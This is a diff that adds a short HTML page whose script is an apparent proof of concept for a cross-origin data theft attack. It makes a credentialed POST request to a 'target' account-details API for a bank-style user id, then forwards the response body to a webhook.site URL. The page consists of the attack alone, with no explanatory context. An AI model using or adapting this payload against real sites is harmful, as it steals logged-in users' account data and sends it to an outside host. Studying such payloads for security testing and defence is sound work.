@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html>
+  <body>
+    <script>
+      fetch("http://target/api/account/details", {
+        method: "POST",
+        credentials: "include",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          requestBody: {
+            timestamp: new Date().toISOString(),
+            data: { userid: "BNK32647" }
+          }
+        })
+      })
+      .then(res => res.text())
+      .then(data => {
+        fetch("https://webhook.site/TON_ID", {
+          method: "POST",
+          body: data
+        });
+      });
+    </script>
+  </body>
+</html>
